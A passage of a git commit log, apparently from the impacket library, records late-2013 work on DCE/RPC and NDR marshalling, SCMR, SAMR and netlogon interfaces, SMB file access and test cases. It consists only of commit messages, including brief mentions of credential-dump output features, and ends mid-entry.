commit 23de460767e55df02b321a63a38798c462f94b02
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:01:00 2013 +0000

    STR() added

commit 9b9d2be372bdfe99831972b0833bed912d10ad7c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:00:34 2013 +0000

    NDRENUM() added

commit d85273cd9df4bcc618bcd9a1f976ccf1b3300c8f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 17:00:18 2013 +0000

    Python 2.7 backport for Python 3.x enum data type

commit 0f5d93acde107526e5bc162af090b9f6b2454a03
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 16:59:21 2013 +0000

    Loooots of new calls added.. still more to go

commit 1e6794fd547eda8b2ba0870a97eea4a819f60b7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 7 16:58:44 2013 +0000

    updated testcases

commit 7bf3f47525b76dce5ae2d4ba1683280e8ade73ab
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:55:49 2013 +0000

    samr test cases I have so far

commit 31e2229cfadba0502d7978c6606b6fdb1c27bd2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:53:19 2013 +0000

    Changes in NDRUnion impacted test cases

commit f54dcca791fca9fa926c9dac19d6e89262498acc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:52:15 2013 +0000

    Samr implementation from scratch.. just starting

commit bb982afe1bdabfa6f63fe1edb978481aad6b9a99
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:51:12 2013 +0000

    I finally understood the difference between RPC_UNICODE_STRING and LPWSTR, setting up the right values here

commit 4164d32b4f1fecfa26c520532ff30f3b460834d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:50:15 2013 +0000

    1) Moved Common data types to dtypes.py
    2) NDRUnion SwitchValue not needed anymore
    3) Added align for NDRSMALL
    4) setitem can now assign NDR classes if they are similar
    5) NDRCall.getData() and NDRCall.fromString() now also call getDataReferent() and fromStringReferent() (not sure about this, testing needed)

commit 9e8f7eae7077060362f1080f61f8ee3a912beee0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 5 22:46:57 2013 +0000

    Added more data definitions from [MS-DTYP]
    1) RPC_SID
    2) ACCESS_MASK
    3) RPC_UNICODE_STRING
    4) WSTR

commit 4b3ecf24b6c7e72b5161519d343b97634a803213
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:47:18 2013 +0000

    Opps.. first line dissapeared somehow

commit b8edb894bd29d75b02c15bae25cd1c72ad8d7b3a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:36:13 2013 +0000

    Since rpcrt is now handling some exceptions, the right one to catch here is rpc_s_access_denied

commit 0e9de8a1c24321b1dbd305fd5408c394591c42c2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:14:44 2013 +0000

    1) hept_lookup() helper function added
    2) removed exception messages that are handled by rpcrt
    3) fixed PrintStringBinding()

commit f8f4a77e4e1cf792d099290732373da3b7462e96
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 4 20:12:45 2013 +0000

    Added DCERPCException()

commit 310d0ca1fe6dacf02e4aecf6d329fa14267a0a30
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:34:27 2013 +0000

    UUID/PUUID types added

commit 42bb487432bfdd56604021fe9386f00c0b29a945
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:34:03 2013 +0000

    Endpoint mapper implementation for the new dcerpc v5

commit 7ce09112b76a4a4de3844fe6073bc118b39bc4fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:29:46 2013 +0000

    More errors that can be triggered inside the rpc runtime

commit d6706d9fb0a5509fe29e3fa3f00adb8763eaeb5a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:29:04 2013 +0000

    UUID is MSRPC_UUID_SCMR

commit e01dcf408fbbc58f954a92ca61874b4dfbcce955
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 15:24:09 2013 +0000

    ErrorCode is not always the return code status.. so, we're just grabbing the last 4 bytes of the answer

commit 9656bed16d40134a01e4dc82f03072bcccf41b43
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 23:18:43 2013 +0000

    1) Fixing calculation of array items when packing (len(itemn.getDataReferent(''))
    2) Setting up default alignment to 4 (let's see if it works... testcases good so far)

commit 17c57ff592d57f1c94ec9e3aa8da539e1a89a97c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 21:04:19 2013 +0000

    More padding issues solved (hopefuly) inside arrays encoding/decoding

commit 92978fceb2e05b939e52f216a7b1bc6f28cc2e4b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 00:33:16 2013 +0000

    Cosmetic changes

commit bc0359470bcda6f94415e4a870e1da2c63985b89
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 00:02:12 2013 +0000

    SCMR errors taken out.. now they are grabbing everything from impacket.system_errors.py

commit 796e6525779cd0f2e8e4770f8be6bdbf577b654f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 23:44:48 2013 +0000

    SYSTEM Errors from [MS-ERREF].

commit 3159f7bcb115b595709e0588cfbdea7cb69d673b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 22:58:16 2013 +0000

    propset ID

commit fc71e1f88f831668d5eb6e02ada3f75911dd8289
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 22:54:44 2013 +0000

    1)Better default parameters for the SCMR helpers
    2)Changed Exception name to DCERPCSessionError

commit de5d1fcdaa392f6820cca5e6c7a6dd281426f59f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 21:01:00 2013 +0000

    Fixed NDRArray.dump() for fields that are not a list

commit 3b4370546261441707080bd6daeac403580bb698
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 29 23:00:19 2013 +0000

    1) All helper methods start with h<method>
    2) No more need of a SCMRDceRpc class
    3) Requests are handled by rpcrt.request()
    4) SessionError exception returns the packet for further inspection

commit 2069e1a07cb5367c0e4334a26fd2c9116399f38a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 29 22:58:40 2013 +0000

    1) Added request() method
    2) Transfer syntax is now stored for later use

commit 07e4c0368c271a474a46f7de646e5b436b3c42e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 28 17:11:24 2013 +0000

    Based on https://code.google.com/p/impacket/issues/detail?id=34, added password history dump (for NTDS.DIT) based on lanjelot's patch. Thanks mate!

commit d08c9c6a13a95858cd3a2ca3ac09bb0d588ac617
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 21:27:08 2013 +0000

    Changing SVCCTLSessionError for SCMRSessionError

commit cefac1e8f3e766bc86013924293c72a577ca58b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 20:56:53 2013 +0000

    Changing NDRPointerNULL() for NULL, easier to read

commit ec4bbb24630df2833ee398d3e0b86fca3e48446f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 20:53:36 2013 +0000

    NULL = NDRPointerNULL()

commit 4d0a3b24efabcfa5f892deb56d7de58d7cc1993e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 19:26:14 2013 +0000

    Getting rid of isNDRCall, and adding topLevel parameter just for NDRPointers

commit 4e74593cae241194e254aa5e878a6bca4a6a3a23
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 05:11:23 2013 +0000

    Importing from v5

commit b4e05b5ad1d8f665d54b9a3a833bff498c10c3fd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 05:08:15 2013 +0000

    Importing from rcprt.py

commit a5b54adba5502f2adf87c931dde40c17a1d1e1aa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 05:03:36 2013 +0000

    Adding rpcrt.py (old dcerpc.py) + transport.py.
    
    Modifying the rest of the sources

commit 674d74852eb15c6e61b1ef95ea1b7aca685ee43e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:43:39 2013 +0000

    Adding headers

commit 964982e3f8b599780c13ee2c5ef594485fe63318
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:41:57 2013 +0000

    dcerpc.v5.scmr test cases

commit 44a2edea5da666c641effda4db97320a3548e45f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:38:38 2013 +0000

    Changing imports to point to dcerpc.v5

commit 441edf6d6542944ba2431f63befca363bf69ab3c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:34:06 2013 +0000

    This is the right name for [MS-SCMR]

commit 00513e1732e77ce224126c2e8815d7e32e2eb8bc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:32:59 2013 +0000

    Bye Bye

commit 73dddeb365ca59fed31e9f1fddab695561b16586
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:28:36 2013 +0000

    Adding the files i'm playing with here. Again, no more development in impacket/dcerpc

commit d57847b4f75a8ad0818190a141e7afc0784bcd6e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:26:09 2013 +0000

    Moving experimental to dcerpc.v5
    
    I'll be working here from now on.. Not touching impacket/dcerpc anymore.
    
    Too many changes going on!

commit 7a03cfa6ec6d67cd98fc53b4f681af9e035abfd7
Author: aurelianocalvo <aurelianocalvo@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 26 17:50:36 2013 +0000

    Changed the appearance of self.child().__str__() to str(self.child()) in order to show child packets that did not implement __str__

commit 60a757e29e5046ed22bdbbfa2bc301154d0deb6a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 21:58:48 2013 +0000

    Changed the Pointers stuff based on previous commit on ndr.
    
    Plus, for svcctl added:
    1) RQueryServiceLockStatusW
    2) RStartServiceW

commit ffdc8e1f5d1f36aa8f5e9324d2249b609d443c1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 21:57:47 2013 +0000

    Chaging the NDRPointer referent name to 'Pointer', trying to make it easier for coders to understand dereferencing.. we'll see.

commit 82a9940a50cb4353ecc49673814af87a97a7a714
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 21:31:45 2013 +0000

    Fixed padding for Arrays

commit 876ec9c525a9cf5a3ca82a98d19a0efa90bb268b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 02:39:24 2013 +0000

    Fixed ChangeServiceConfigW()

commit 02108d261c7c1cd2bd52665074509ce10a02f9cd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 01:01:10 2013 +0000

    These are interfaces i'm playing with the new ndr engine so I don't mess up the current ones. This directory will be removed once they are ready.

commit eaceacad99382ea14f88bf0ed89a36f4349a3407
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 22:17:36 2013 +0000

    1) RPC_UNICODE_STRING now accepts regular strings, and takes care of encoding/decoding them
    2) More NDRPointer optimization to make it work when receiving/sending NULL pointers
    3) Fixed wrong UNICODE_STRING() base class (it should be NDR, not NDRPointer)

commit ea7137d818bcd55d420b43912c9c68616cb1eb78
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 14:06:59 2013 +0000

    Removed debug message

commit f5c860da186aca978ad3cc5e2c07d95966fdf52a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 13:40:42 2013 +0000

    Adjusting NDRPointer, when it's null, depending on whether we're under NDR64 or not

commit 8364edb2529e4430e42b083c7bcf83c4683dc9c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 00:13:14 2013 +0000

    edefined UNIQUE_RPC_UNICODE_STRING for consistency.. Yes.. we will need to do a ['Data']['Data'] to assign a value, but it actually makes sense.
    Added check inside NDRPointer if we receive a NULL Pointer, so we don't keep unpacking the rest.
    Added consistency check, which bassically does, for every struct unpacked, checks if the packing matches the original data. Just for debugging purposes (turned on now).
    netlogon changes based on ndr.py changes.
    
    Don't use netlogon.. I'm using it to test ndr.py

commit 9f69c9927716b8a0c7f09df97437c5e1768567c2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 20 02:12:42 2013 +0000

    Okey.. We're getting closer.. although this might not work.
    I'm taking out the embeeded pointers and top level pointers. According to [C-706], top level pointers are the ones that are in a DCE Call (and their referents are NOT represented later), whereas the other pointers are embedded pointers (with deffer the representation).
    
    So.. in order to make it easy to define NDR types, i'm creating a single class NDRPointer, which will act different when it is part of a DCE Call or it's inside a structure/array/etc.
    
    We'll see.. wort case, we come back to the previous revision

commit 72bcfb39195501a50b0ccac56256618aee77b829
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 19 21:40:52 2013 +0000

    getDataReferent must return the actual data even if there's nothing to process
    added PNDRUniConformantVaryingArray()

commit fe655e46f81416a0a35bc898a2befc83bab30a1e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 19 14:48:45 2013 +0000

    Based on feedback from Renaud Dubourguais we're changing some behaviour when retrieving/storing files, allowing to set th
    e share access mode, aiming at making this change dialect independent. This involves:
    
    1) smbconnection: changed getFile() and putFile(), adding a shareAccessMode parameter
    2) smb3.py: changed retrieveFile(), storeFile(), adding a shareAccessMode parameter
    3) smb.py: changed nt_create_andx(), retr_file(), stor_file(), stor_file_nonraw() adding a shareAccesMode, and using nt_create_andx as the way to open the files, so we keep the same shareAccesMode flags across the different dialects.
    
    Functionality shouldn't change if no shareAccessMode flags are specified

commit 4082fd1d312ccff27207ef6dd7ee2193c094d724
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Nov 18 16:12:05 2013 +0000

    Fixed arrays marshaling/unmarshaling where the referent data was not processed

commit b8be1d76ea90e9b191a11d52e0e5112aa2289b70
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 18:52:42 2013 +0000

    PNL_SITE_NAME_ARRAY is a toplevelpointer

commit 9576e329b05e454223127aef201967bf5dceb6d3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 18:52:14 2013 +0000

    Still have to solve the situation of nested arrays with referent data. Leaving it commented for now

commit 76cef7696e8ff4e455c697a8b5cecd4b12cfb571
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 18:24:59 2013 +0000

    Removed debug msg

commit 6cfdb9f99fd8429bfde18a25d76b206216f5c7e5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 17:56:55 2013 +0000

    LPWSTR2 is actually a PRPC_UNICODE_STRING. Still, [MS-DTYP] contradicts other documents describing such structures. Hence, there might be changes in the future until I figure out of things actually are :s

commit b091961a9e78278d688dbb2cb93c6ae92232aff9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 17:45:31 2013 +0000

    Redefinition of RPC_UNICODE_STRING, UNIQUE_RPC_UNICODE_STRING

commit e383907b462c1bb2e3a6fc1ba56786fe8705f159
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 16:39:00 2013 +0000

    Fixed bad definition of NDRPointerNULL

commit 8040cb5997f82b4ff8ce145bc8fec9f09223173e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 15:55:38 2013 +0000

    Added NDRCall(). This should be the base class for every DCERPC structure call. Still testing

commit cb1095ac0c0e76921ecdc8270f4c9ebf3c183c62
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 15:11:42 2013 +0000

    Minimal changes.. still pending managing the representation of referents correctly, according to [C706], 14.3.12.3 Algorithm for Deferral of Referents

commit a44f796a67d8fd5566b1ea858a222b32387a4046
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 01:27:52 2013 +0000

    Better handling of arrays and referent's data

commit 3b4b460ec1a509010d163b67922770c18f8afd9d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 15 21:13:07 2013 +0000

    Continuing with r992, testing the new NDR lib. Still lots to do

commit 1c4689255c92242c77f5730313c6b939b4003a35
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 14 21:45:52 2013 +0000

    Since I added this a few days ago, I'm experimenting with NDR inside this interface. Marshalling gets much simpler.

commit ec52aa727309b57648097749658d0c795c199d62
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 14 21:45:00 2013 +0000

    [C706] Transfer NDR Syntax initial implementation.
    Needed for so long. The objective is these classes to be the foundation for all NDR encodings. ndrutils will be gone eventually. Testing needed

commit b7964844564f51f2aceb5903e08cff7546110f8e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 12 16:26:58 2013 +0000

    Don't stop at the first share w/o write permissions. keep trying

commit 02120781d31f8305da8178d4907308040a4d4880
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 23:01:51 2013 +0000

    Updated test cases.. dummy passwords for my lab

commit 9c235ca5360212ed9438ff8a3094caad5a33694b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 22:38:49 2013 +0000

    Added NetrLogonGetCapabilities(), NetrLogonGetDomainInfo() (not finished yet)

commit 1e416549b281072ba332a2485be0aa6685742560
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 20:47:57 2013 +0000

    More changes here. I'm adapting the code so another SSP (netlogon) is supported by the dcerpc runtime. Still work to be done (not working at the moment), but shouldn't interfere with WINNT SSP at all (crossing fingers)

commit 092d41aa15c26745bf4790df231f03c8012968cf
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 20:46:19 2013 +0000

    Added ComputeNetlogonCredentialAES(), ComputeSessionKeyAES(), ComputeNetlogonSignatureAES(), encryptSequenceNumberAES(), decryptSequenceNumberAES(), SIGN(), SEAL(), UNSEAL().
    
    In short, all the cryptographic operations for netlogon SSP should be there. Now we gotta test them more

commit b9ada53288be978faeda630d4fbd6c6ef0f49f9c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 22:47:13 2013 +0000

    Moving some crypto stuff into netlogon. They shouldn't be used by anyone else, so it makes sense to be just inside netlogon

commit 5e7d57d87410efe2134d665406dc8131a93a8b36
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 21:24:21 2013 +0000

    Only the first 8 bytes are the ones that matter

commit 79793bf9156feb01090cb34636e4a29b01565fdf
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 21:18:52 2013 +0000

    Added getSSPType1(), SIGN() and deriveSequenceNumber(). I'm not sure this will be here in the future since this is the netlogon SSP

commit fa985fffcce27a7891385b9812ea155928e27881
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 21:17:30 2013 +0000

    Added encryptSequenceNumberRC4() decryptSequenceNumberRC4()

commit ec14f20550f688d922d3f6739c155a36ee9d758d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 19:16:04 2013 +0000

    Adding some structures and functions for the NETLOGON security provider. Still not used

commit 50e5f50df0fe7471ed01a7d49c7215fff1ed58ef
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 19:13:10 2013 +0000

    Big changes on DCERPC Runtime, aiming at making it more flexible for future stuff to be added.
    
    dcerpc.py:
    1) Security Provides and Auth Levels added
    2) Changed most of the structures in such a way that they work not only for creating packets, but for parsing packets (before it was just one way).
    3) MSRPCArray() and MSRPCNamedArray() moved to samr
    4) SEC_TRAILER() structure added, following the recommendations of [MS-RPCE]
    5) Calling to SEAL/SIGN changed, isDCE not available anymore
    
    ntlm.py:
    1) DCERPC_NTLM* structures are gone. Didn't make any sense in the context of ntlm.py. Now ntlm.py crafts the same structures
    regardless of who's calling them (smb or dcerpc), and it's up to the caller to treat them in their language. This is aimed at making ntlm.py as general as possible as a security provider
    2) the isDCE argument for various functions is removed. Not needed anymore, based on 1). Special attention should be kept for thos using getNTLMSSPType1(),getNTLMSSPType3(),MAC(),SEAL() and SIGN() in their implementations since the amount of parameters changed
    
    srvsvcserver.py:
    1) ntlm.DCERPC_NTLMAuthHeader not available anymore, replaced by SEC_TRAILER()
    
    test_ntlm.py:
    1) Changed SEAL() call since isDCE is not there anymore

commit cacffb703830b9f1f5cacf9d0596fed64aa9b356
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 18:57:30 2013 +0000

    Test cases for the DCERPC runtime.

commit adba0fb24ffc5a0967f603ec461d34169f4ca11c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 18:55:58 2013 +0000

    We don't need this anymore

commit e3859e47443be9d41213d94c1cbd91ef4bc2c298
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 17:42:11 2013 +0000

    More test cases added. Except for the named pipes methods exposed by smbConnection, we're testing the rest of the methods, for each dialect we support

commit 1141246543e176de67413c53ee0a61d08ce4c782
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 22:20:26 2013 +0000

    MSRPCNameArray() and MSRPCArray() are only used here. Soon to be erased from dcerpc.py

commit 989f6b17f550b0404e9005c4b2b531a45a4174bb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 21:45:38 2013 +0000

    Added ::: at the end of the credentials grabbed so it's compatible with ophcrack

commit 44ec59cc26aec6d4b4bd5e53efdb667dd5f24bfb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 21:21:13 2013 +0000

    No need to send isDCE parameter. It will be deprecated soon

commit 25c451cd577bcd1f8f607600e2a3d0baf51c5acb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 21:10:06 2013 +0000

    Don't fail if we don't have a smb.log

commit ff1bfc86fcb3a686d63ff5bd724b3d705af43189
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 20:46:16 2013 +0000

    Removed raise when an exception is triggered

commit 147791a176454e280efdd0d816e701e80c6d72ed
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 6 16:40:15 2013 +0000

    Auth levels should actually be here, not inside ntlm.py

commit e79fafc5af03f4bf90134804879ad47927fcda53
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 6 00:37:41 2013 +0000

    Adding set_auth_type() for future use

commit e36492a489756bf1a84981b5b463924e4d581d19
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 23:47:41 2013 +0000

    Changed NETLOGONServerGetTrustInfoResponse(), in particular PNL_GENERIC_RPC_DATA. I'm still not sure it's right since I can't get enough tests yet.

commit 5c2bf2b500495e0a1d6e26c4189bb40b9f10be7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 23:38:21 2013 +0000

    using commonHdr instead of structure, easier to include in other structures

commit e4772b97bd07e2d37830073a2c31cb3c6459f9e1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 23:32:12 2013 +0000

    MACHINE.ACC secrets printed out much better.. including the machine name and domain whenever it's possible

commit d14765341a7edfaeeee3b0bd99af94b6c81fd633
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 21:49:35 2013 +0000

    Added NetrServerPasswordGet()

commit 78b1b7cc0cb54bf4b536c1be875c7df3dfabd63b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 21:03:34 2013 +0000

    Added NetrServerGetTrustInfo()

commit c1b4688f02368d9e22d9090687a086b1e6a3e7a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 20:54:58 2013 +0000

    Added [MS-SAMR] Section 2.2.11.1.1

commit cd3b3db7679700e3e2999d45dd3504ac3f0eea77
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Nov 4 21:00:50 2013 +0000

    updated KNOWN_PROTOCOLS

commit f25c099fae201e78f876fa068d4b713192c1f4fa
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 20:59:37 2013 +0000

    Added NetrShareGetInfo().
    Removed unnecessary structures.. moved soon to be removed functions to the end of the file

commit 7ea54718cd2165b8431a0d4f769dcb01835fedff
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 19:55:57 2013 +0000

    All structs from srvsvc.py that were removed copied here. They are still being used. I'll port this whole file later

commit 7b6a63f81cd8bc7c500b940a72b3bcda64d6f597
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
